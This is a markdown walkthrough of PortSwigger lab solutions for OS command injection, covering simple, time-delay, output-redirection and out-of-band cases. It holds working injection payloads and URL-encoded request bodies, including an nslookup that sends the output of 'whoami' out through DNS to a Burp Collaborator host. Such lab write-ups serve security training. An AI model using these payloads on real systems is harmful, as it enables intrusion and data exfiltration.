## OS command injection 



## Table of Contents

- [OS command injection, simple case](#os-command-injection-simple-case)


### [OS command injection, simple case](https://portswigger.net/web-security/os-command-injection/lab-simple)

Goal : execute the `whoami` command to determine the name of the current user.

- intercept and modify a request that checks the stock level.

- append `|whoami` or `;whoami` to the `storeId` parameter 

- you can use this also`productId=1%26+whoami+%23&storeId=1` it's encoded with URL encoding (`productId=1& whoami #&storeId=1`)

- check the name in the response

  



<img src=".\command_injection_img\1_1.png" style="zoom:80%;" />





------







### [Blind OS command injection with time delays](https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays)

Goal : exploit the blind OS command injection vulnerability to cause a 10 second delay.

- go to `submit feedback`

- I tried a lot of payloads in different parameters and finally these payloads solved the lab
  ```
  karim&`ping -c 10 127.0.0.1`#&
  OR
  karim&`sleep 10`#&
  ```

- put any one in the name or email parameter and send the request







------



### [Blind OS command injection with output redirection](https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection)

Goal : execute the `whoami` command and retrieve the output.

- go to `submit feedback`

- write the payload from previous lab `%26+sleep+10+%23+` (`& sleep 10 # `) in the email parameter

- notice that it takes 10 seconds to respond , so this parameter is vulnerable

- append the payload to email parameter with URL encoding
  ```
  & whoami > /var/www/images/whoami.txt #
  ```

- open any image in new tab , replace its name with whoami.txt



![](.\command_injection_img\2_1.png)





------





### [Blind OS command injection with out-of-band interaction](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band)

Goal :  exploit the blind OS command injection vulnerability to issue a DNS lookup to Burp Collaborator.

- go to `submit feedback`

- submit any values

- from `Burp collaborator client `  click `copy to clipboard` 

- send this request `POST /feedback/submit ` to burp repeater

- add the payload to the email parameter (we know that is the vulnerable parameter from the previous labs)
  ```bash
  &nslookup <your_own>.burpcollaborator.net #&
  ```

- but encode it with URL encoding

- the request body will look like this
  ```bash
  csrf=UfTw8aBwMGPhF6MGrJy2VBawdAB06GQ5&name=karim&email=123%40gmail.com%26nslookup%20y21kg9ifjgutl206yib4mhvtrkxdl2.burpcollaborator.net%20%23&subject=123&message=123
  ```

  <img src=".\command_injection_img\3_1.png" style="zoom:80%;" />

- send the request

- if you go to `Burp collaborator client` and click pull now , you will see the DNS request to our domain

<img src=".\command_injection_img\3_2.png" style="zoom:80%;" />



------





### [Blind OS command injection with out-of-band data exfiltration](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration)

Goal : execute the `whoami` command and exfiltrate the output via a DNS query to Burp Collaborator. 

- go to `submit feedback`

- submit any values

- from `Burp collaborator client `  click `copy to clipboard` 

- send this request `POST /feedback/submit ` to burp repeater

- add the payload to the email parameter (we know that is the vulnerable parameter from the previous labs)

  ```bash
  & nslookup `whoami`.79etnipoqp12sb7f5ridtq22yt4nsc.burpcollaborator.net #&
  ```

- but encode it with URL encoding

- the request body will look like this
  ```bash
  csrf=5mJNRXmKKLVevRpFlC9NqvcKUm5LwMJH&name=karim&email=123%40g.com%26%20nslookup%20%60whoami%60.79etnipoqp12sb7f5ridtq22yt4nsc.burpcollaborator.net%20%23&subject=123&message=123
  ```

- send the request

- if you go to `Burp collaborator client` and click pull now , you will see the DNS request to our domain



<img src=".\command_injection_img\4_1.png" style="zoom:80%;" />







------



